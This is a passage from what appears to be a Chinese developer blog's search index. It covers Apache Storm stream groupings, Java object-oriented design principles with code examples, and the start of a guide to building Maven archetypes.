Grouping消息流组定义一个流如何分配Tuple到Bolt。Storm包含6中流分组类型。<br>1、随机分组：随机分发Tuple到Bolt任务，保证每个任务获取相同的Tople。<br>2、字段分组：指定字段分割数据流并分组，相同的字段分到相同的Bolt，不同字段分配到不同的Bolt。<br>3、全部分组：对于每个Tuple来说，所有Bolt都会收到，所有Tuple复制到Bolt的所有任务上，需谨慎使用。<br>4、全局分组：全部流都分配到Bolt的同一个任务，就是分配到ID最小的Task上。<br>5、无分组：目前等效于随机分组<br>6、直接分组：Tuple生产者决定Tuple消费者任务接收。改分组仅被声明为direct stream的流使用。Tuple必须通过emitDirect直接发射。</p>\n<h3 id=\"事务\"><a href=\"#事务\" class=\"headerlink\" title=\"事务\"></a>事务</h3><p>事务为了解决Tuple在处理失败后重新发送提出.事务拓扑是指Storm以并行和顺序混合的方式处理Tuple，为了实现对消息的精确处理。<br>事务拓扑的目的是满足对消息处理有着极其严格要求的场景，要求结果完全精确。可以通过修改transactional.zookeeper中server和port指定其他ZooKeeper。</p>\n<h3 id=\"数据流模型\"><a href=\"#数据流模型\" class=\"headerlink\" title=\"数据流模型\"></a>数据流模型</h3><p>数据流处理如下<br>定义数据 -&gt; 定义数据处理 -&gt; 定义数据节点处理 -&gt; 定义数据处理任务实例 -&gt; 读取数据源头产生的数据 -&gt; 节点上运行任务实例 -&gt; 下一个节点运行任务实例 -&gt; … -&gt; 输出结果</p>\n","categories":["Storm学习"],"tags":["Storm","Storm概念"]},{"title":"Java设计模式之面向对象设计原则","url":"/2017/08/31/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/","content":"<h2 id=\"Java设计模式\"><a href=\"#Java设计模式\" class=\"headerlink\" title=\"Java设计模式\"></a>Java设计模式</h2><p><img src=\"/images/old/20170831%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-08-31%E4%B8%8A%E5%8D%888.33.33.png\"></p>\n<h3 id=\"面向对象设计原则：\"><a href=\"#面向对象设计原则：\" class=\"headerlink\" title=\"面向对象设计原则：\"></a>面向对象设计原则：</h3><blockquote>\n<ul>\n<li>单一职责原则：一个类只负责一个功能领域中的相应职责</li>\n<li>开闭原则：软件实体应对扩展开放，而对修改关闭</li>\n<li>里式代换原则：所有引用基类对象的地方能够透明地使用其子类的对象</li>\n<li>依赖倒转原则：抽象不应该依赖于细节，细节应该依赖于抽象</li>\n<li>接口隔离原则：使用多个专门的接口，而不使用单一的总接口</li>\n<li>合成复用原则：尽量使用对象组合，而不是继承来达到复用的目的</li>\n<li>迪米特法则：一个软件实体应当尽可能少地与其他实体发生相互作用</li>\n</ul>\n</blockquote>\n<h4 id=\"单一职责原则（Single-Responsibility-Principle-SRP）：\"><a href=\"#单一职责原则（Single-Responsibility-Principle-SRP）：\" class=\"headerlink\" title=\"单一职责原则（Single Responsibility Principle, SRP）：\"></a>单一职责原则（Single Responsibility Principle, SRP）：</h4><blockquote>\n<p>单一职责原则是最简单的面向对象设计原则，它用于控制类的粒度大小。一个类只负责一个功能领域中的相应职责。</p>\n</blockquote>\n<span id=\"more\"></span>\n<p><strong>问题</strong> ：在系统一个类负责了多个功能，展示数据，处理逻辑，查询数据库，连接数据库。当需求发生变化时，逻辑变更，可能会导致其他功能发生故障。如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ActivityService</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">showAllAcitivty</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        queryActivity();</span><br><span class=\"line\">        <span class=\"comment\">//处理其他相关业务逻辑</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> Connection <span class=\"title function_\">getConnection</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//连接数据库</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;Object&gt; <span class=\"title function_\">queryActivity</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        getConnection();</span><br><span class=\"line\">        <span class=\"comment\">//查询数据</span></span><br><span class=\"line\">        <span class=\"comment\">//封装数据</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>UML类图如下：<br><img src=\"/images/old/20170831%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-08-31%E4%B8%8A%E5%8D%8810.52.32.png\"><br>这里改类承担太多功能，需要从新改进，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ActivityService</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">showAllAcitivty</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">ActivityDao</span>().queryActivity();</span><br><span class=\"line\">        <span class=\"comment\">//处理其他相关业务逻辑</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ActivityDao</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;Object&gt; <span class=\"title function_\">queryActivity</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        DBUtils.getConnection();</span><br><span class=\"line\">        <span class=\"comment\">//查询数据</span></span><br><span class=\"line\">        <span class=\"comment\">//封装数据</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DBUtils</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Connection <span class=\"title function_\">getConnection</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//连接数据库</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>UML类图如下：<br><img src=\"/images/old/20170831%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-08-31%E4%B8%8A%E5%8D%8811.40.30.png\"><br><strong>注意</strong>：在使用单一职责原则时，在拆分功能时，不要拆分太细，以免出现太多类。</p>\n<h4 id=\"开闭原则（Open-Closed-Principle-OCP）：\"><a href=\"#开闭原则（Open-Closed-Principle-OCP）：\" class=\"headerlink\" title=\"开闭原则（Open-Closed Principle, OCP）：\"></a>开闭原则（Open-Closed Principle, OCP）：</h4><blockquote>\n<p>一个软件实体应当对扩展开放，对修改关闭。即软件实体应尽量在不修改原有代码的情况下进行扩展。开闭原则是面向对象的可复用设计的第一块基石，它是最重要的面向对象设计原则。在开闭原则的定义中，软件实体可以指一个软件模块、一个由多个类组成的局部结构或一个独立的类。</p>\n</blockquote>\n<p>问题：现在需要依据不同的情况画不同的图，有饼图、条形图，项目后期有需求增加，需要增加折线图，这样就需要重新修改代码。如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ChartDisplay</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        display(<span class=\"string\">&quot;bar&quot;</span>);</span><br><span class=\"line\">        display(<span class=\"string\">&quot;pie&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//画图</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">display</span><span class=\"params\">(String type)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果每次增加一种类型都需要修改源码，新增判断</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">&quot;bar&quot;</span>.equals(type))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">BarChart</span>().display();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"string\">&quot;pie&quot;</span>.equals(type))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">PieChart</span>().display();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BarChart</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">display</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;画条形图&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PieChart</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">display</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;画饼图&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>UML类图如下：<br><img src=\"/images/old/20170831%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-08-31%E4%B8%8A%E5%8D%8811.46.40.png\"><br>这里不符合开闭原则，需要代码重构，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//新增一个画画抽象类</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractChart</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">display</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//具体子类实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BarChart</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractChart</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">display</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;画条形图&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//具体子类实现</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PieChart</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractChart</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">display</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;画饼图&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ChartDisplay</span> &#123;</span><br><span class=\"line\">    AbstractChart chart;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setChart</span><span class=\"params\">(AbstractChart chart)</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.chart = chart;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">display</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        chart.display();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">ChartDisplay</span> <span class=\"variable\">chartDisplay</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChartDisplay</span>();</span><br><span class=\"line\">        <span class=\"comment\">//这里setChart可以通过读取配置文件获取</span></span><br><span class=\"line\">        chartDisplay.setChart(<span class=\"keyword\">new</span> <span class=\"title class_\">BarChart</span>());</span><br><span class=\"line\">        chartDisplay.display();</span><br><span class=\"line\">        <span class=\"comment\">//这里setChart可以通过读取配置文件获取</span></span><br><span class=\"line\">        chartDisplay.setChart(<span class=\"keyword\">new</span> <span class=\"title class_\">PieChart</span>());</span><br><span class=\"line\">        chartDisplay.display();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>UML类图如下：<br><img src=\"/images/old/20170831%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-08-31%E4%B8%8B%E5%8D%8812.00.36.png\"><br>在改进方法后，在添加新的画图，只要添加一个新子类就可以实现。</p>\n<p><strong>注</strong>：在修改xml和properties等配置文件时，因为无需重新编译源代码，即可认为是符合开闭原则。</p>\n<h4 id=\"里氏代换原则（Liskov-Substitution-Principle-LSP）\"><a href=\"#里氏代换原则（Liskov-Substitution-Principle-LSP）\" class=\"headerlink\" title=\"里氏代换原则（Liskov Substitution Principle, LSP）\"></a>里氏代换原则（Liskov Substitution Principle, LSP）</h4><blockquote>\n<p>如果对每一个类型为 T1的对象 o1，都有类型为 T2 的对象o2，使得以 T1定义的所有程序 P 在所有的对象 o1 都代换成 o2 时，程序 P 的行为没有发生变化，那么类型 T2 是类型 T1 的子类型。所有引用基类的地方必须能透明地使用其子类的对象。也可以理解为：子类可以扩展父类的功能，但不能改变父类原有的功能。</p>\n</blockquote>\n<p>这个不举例子，在使用java继承的时候，如果不覆盖父类方法就符合里氏代换原则。在使用过程中，如果可以尽量不要覆盖父类方法，可以使用重载，添加一个比父类更加宽松的行参。或者重新定义一个新方法。或者使用抽象编程。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Father</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">insert</span><span class=\"params\">(ArrayList&lt;String&gt; params )</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"built_in\">this</span>.getClass().getSimpleName() + <span class=\"string\">&quot;.insert&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">select</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"built_in\">this</span>.getClass().getSimpleName() + <span class=\"string\">&quot;.select&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Child</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Father</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">insert</span><span class=\"params\">(List&lt;String&gt; params)</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"built_in\">this</span>.getClass().getSimpleName() + <span class=\"string\">&quot;.insert&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">select</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">          System.out.println(<span class=\"built_in\">this</span>.getClass().getSimpleName() + <span class=\"string\">&quot;.select&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Excemple</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//在传递子类过来时，会执行子类的方法，不符合该原则</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">select</span><span class=\"params\">(Father father)</span>&#123;</span><br><span class=\"line\">        father.select();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"依赖倒转原则（Dependence-Inversion-Principle-DIP）\"><a href=\"#依赖倒转原则（Dependence-Inversion-Principle-DIP）\" class=\"headerlink\" title=\"依赖倒转原则（Dependence Inversion Principle, DIP）\"></a>依赖倒转原则（Dependence Inversion Principle, DIP）</h4><blockquote>\n<p>高层模块不应该依赖低层模块，二者都应该依赖其抽象；抽象不应该依赖细节；细节应该依赖抽象。换言之，要针对接口编程，而不是针对实现编程。</p>\n</blockquote>\n<p>例子可以看之前开闭原则中，ChartDisplay.setChart传入的是抽象类，而不是具体的某一个实现类。</p>\n<h4 id=\"接口隔离原则（Interface-Segregation-Principle-ISP）\"><a href=\"#接口隔离原则（Interface-Segregation-Principle-ISP）\" class=\"headerlink\" title=\"接口隔离原则（Interface Segregation Principle, ISP）\"></a>接口隔离原则（Interface Segregation Principle, ISP）</h4><blockquote>\n<p>使用多个专门的接口，而不使用单一的总接口，即客户端不应该依赖那些它不需要的接口。根据接口隔离原则，当一个接口太大时，我们需要将它分割成一些更细小的接口，使用该接口的客户端仅需知道与之相关的方法即可。每一个接口应该承担一种相对独立的角色，不干不该干的事，该干的事都要干。</p>\n</blockquote>\n<p>Spring中XmlWebApplication的继承关系图：<br><img src=\"/images/old/20170831%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-08-31%E4%B8%8B%E5%8D%883.24.01.png\"></p>\n<p>很多接口拆分的比较细</p>\n<h4 id=\"合成复用原则（Composite-Reuse-Principle-CRP）\"><a href=\"#合成复用原则（Composite-Reuse-Principle-CRP）\" class=\"headerlink\" title=\"合成复用原则（Composite Reuse Principle, CRP）\"></a>合成复用原则（Composite Reuse Principle, CRP）</h4><blockquote>\n<p>尽量使用对象组合，而不是继承来达到复用的目的。合成复用原则就是在一个新的对象里通过关联关系（包括组合关系和聚合关系）来使用一些已有的对象，使之成为新对象的一部分；新对象通过委派调用已有对象的方法达到复用功能的目的。简言之：复用时要尽量使用组合&#x2F;聚合关系（关联关系），少用继承。</p>\n</blockquote>\n<h4 id=\"迪米特法则（Law-of-Demeter-LOD）\"><a href=\"#迪米特法则（Law-of-Demeter-LOD）\" class=\"headerlink\" title=\"迪米特法则（Law of Demeter, LOD）\"></a>迪米特法则（Law of Demeter, LOD）</h4><blockquote>\n<p>如果一个系统符合迪米特法则，那么当其中某一个模块发生修改时，就会尽量少地影响其他模块，扩展会相对容易，这是对软件实体之间通信的限制，迪米特法则要求限制软件实体之间通信的宽度和深度。迪米特法则可降低系统的耦合度，使类与类之间保持松散的耦合关系。</p>\n</blockquote>\n<p>当一个类与其他类之间依赖关系越多，耦合度越大时，类发生变化将会导致影响面越大、越广。而遵循迪米特法则就是为了尽量降低类与类之间的耦合度。迪米特法则定义不要和“陌生人”说话，只与你的直接朋友通信联系。朋友有：对象本身、类方法的（输入输出）参数、类成员。而出现在局部变量中的类就不是直接的朋友，即“陌生人”。在设计系统的时候，必须无法解耦，可以借用第三方进行转发调用（可使用外观模式Facade）。</p>\n","categories":["设计模式"],"tags":["Java","设计模式","面向对象设计原则"]},{"title":"创建maven archetypes","url":"/2017/09/08/%E5%88%9B%E5%BB%BAmaven-archetypes/","content":"<h2 id=\"建立maven-archetypes，后期快速搭建项目\"><a href=\"#建立maven-archetypes，后期快速搭建项目\" class=\"headerlink\" title=\"建立maven archetypes，后期快速搭建项目\"></a>建立maven archetypes，后期快速搭建项目</h2><h4 id=\"创建一个空的maven项目\"><a href=\"#创建一个空的maven项目\" class=\"headerlink\" title=\"创建一个空的maven项目\"></a>创建一个空的maven项目</h4><p>修改当前maven项目pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.whh.maven.archetypes<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>quick-ssm-webapp<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">packaging</span>&gt;</span>jar<span class=\"tag\">&lt;/<span class=\"name\">packaging</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.0.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>quick-ssm-webapp Maven Webapp<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>http://maven.apache.org<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">finalName</span>&gt;</span>quick-ssm-webapp<span class=\"tag\">&lt;/<span class=\"name\">finalName</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">pluginManagement</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-archetype-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.4<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">pluginManagement</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h4 id=\"配置相关文件\"><a href=\"#配置相关文件\" class=\"headerlink\" title=\"配置相关文件\"></a>配置相关文件</h4><p>目录结构如下<br><img src=\"/images/old/20170908%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-08%E4%B8%8A%E5%8D%8810.13.35.png\"><br>目录<strong>archetype-resources</strong>下配置需要生成的项目，在使用maven生成项目时，目录结构和archetype-resources下目录一致。<br>目录<strong>META-INF&#x2F;maven</strong>下<em>archetype-metadata.xml</em>设置生成规则<br>如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">archetype-descriptor</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sample&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">fileSets</span>&gt;</span></span><br><span class=\"line\">      <span class=\"comment\">&lt;!-- package为true表示通过groupId自动生成包 --&gt;</span></span><br><span class=\"line\">      <span class=\"comment\">&lt;!-- 如下配置表示archetype-resources下文件有效文件 --&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">fileSet</span> <span class=\"attr\">filtered</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">packaged</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/java<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">fileSet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">fileSet</span> <span class=\"attr\">filtered</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/resources<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.*<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">fileSet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">fileSet</span> <span class=\"attr\">filtered</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/webapp<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.**<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">fileSet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">fileSet</span> <span class=\"attr\">filtered</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/webapp/static<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.**<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">fileSet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">fileSet</span> <span class=\"attr\">filtered</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">packaged</span>=<span 